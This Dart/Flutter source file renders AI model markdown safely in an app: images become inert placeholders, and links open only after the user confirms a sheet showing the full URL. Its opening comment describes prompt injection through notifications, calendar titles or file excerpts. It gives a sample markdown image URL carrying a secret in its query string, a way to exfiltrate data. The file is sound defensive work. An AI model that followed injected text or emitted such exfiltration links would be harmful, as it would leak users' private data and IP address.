/// The one place model-rendered markdown is made safe.
///
/// Model output can be steered by untrusted text (notifications, calendar
/// titles, file excerpts), so rendering it must never reach the network by
/// itself: a `![](https://x/?d=secret)` image would leak the query string and
/// the phone's IP the moment the bubble builds. Every `MarkdownBody` in the app
/// therefore passes [safeMarkdownImageBuilder] (an inert placeholder, never
/// `Image.network`/`Image.file`) and routes link taps through
/// [confirmAndOpenMarkdownLink] (a sheet that shows the full URL; nothing opens
/// until the user confirms).
library;

import 'dart:async';

import 'package:flutter/material.dart';
import 'package:url_launcher/url_launcher.dart';

import '../theme/dhruva_theme_extension.dart';
import '../widgets/dhruva_sheet.dart';

/// Placeholder for any markdown image. The [uri] is never touched. Local and
/// remote URIs are treated alike: the app has no feature that needs
/// model-chosen images.
Widget safeMarkdownImageBuilder(Uri uri, String? title, String? alt) =>
    const _ImagePlaceholder();

class _ImagePlaceholder extends StatelessWidget {
  const _ImagePlaceholder();

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final tokens = theme.extension<DhruvaTokens>()!;
    return Container(
      key: const ValueKey('markdown-image-placeholder'),
      padding: EdgeInsets.symmetric(
        horizontal: tokens.spacing.sm,
        vertical: tokens.spacing.xs,
      ),
      decoration: BoxDecoration(
        color: theme.colorScheme.surfaceContainerHighest,
        borderRadius: BorderRadius.circular(tokens.radius.sm),
      ),
      child: Text(
        'Image not loaded',
        style: theme.textTheme.bodySmall?.copyWith(
          color: theme.colorScheme.onSurfaceVariant,
        ),
      ),
    );
  }
}

typedef LinkLauncher = Future<bool> Function(Uri uri);

Future<bool> _externalLaunch(Uri uri) =>
    launchUrl(uri, mode: LaunchMode.externalApplication);

/// Only `http`/`https` with a host are ever offered (a `javascript:`, `file:`
/// or `intent:` href is a trust-boundary case, not a link).
Uri? parseOpenableLink(String? href) {
  if (href == null) return null;
  final uri = Uri.tryParse(href.trim());
  if (uri == null || !uri.hasAuthority || uri.host.isEmpty) return null;
  if (uri.scheme != 'http' && uri.scheme != 'https') return null;
  return uri;
}

/// A user tap on a link: show the full URL and open it only on "Open".
Future<void> confirmAndOpenMarkdownLink(
  BuildContext context,
  String? href, {
  LinkLauncher launch = _externalLaunch,
}) async {
  final uri = parseOpenableLink(href);
  if (uri == null) return;
  final ok = await showDhruvaSheet<bool>(
    context: context,
    useSafeArea: true,
    showDragHandle: true,
    builder: (_) => _LinkConfirmSheet(uri: uri),
  );
  if (ok == true) unawaited(launch(uri));
}

class _LinkConfirmSheet extends StatelessWidget {
  const _LinkConfirmSheet({required this.uri});
  final Uri uri;

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final tokens = theme.extension<DhruvaTokens>()!;
    return Padding(
      padding: EdgeInsets.fromLTRB(
        tokens.spacing.base,
        0,
        tokens.spacing.base,
        tokens.spacing.base,
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text('Open this link?', style: theme.textTheme.titleMedium),
          SizedBox(height: tokens.spacing.xs),
          Text(
            'It leaves the app and opens in your browser. The address comes '
            'from a reply, so check it first.',
            style: theme.textTheme.bodyMedium?.copyWith(
              color: theme.colorScheme.onSurfaceVariant,
            ),
          ),
          SizedBox(height: tokens.spacing.sm),
          Flexible(
            child: SingleChildScrollView(
              child: SelectableText(
                uri.toString(),
                key: const ValueKey('link-confirm-url'),
                style: theme.textTheme.bodyMedium,
              ),
            ),
          ),
          SizedBox(height: tokens.spacing.base),
          Row(
            children: [
              Expanded(
                child: OutlinedButton(
                  key: const ValueKey('link-confirm-cancel'),
                  onPressed: () => Navigator.pop(context, false),
                  child: const Text('Cancel'),
                ),
              ),
              SizedBox(width: tokens.spacing.sm),
              Expanded(
                child: FilledButton(
                  key: const ValueKey('link-confirm-open'),
                  onPressed: () => Navigator.pop(context, true),
                  child: const Text('Open'),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}
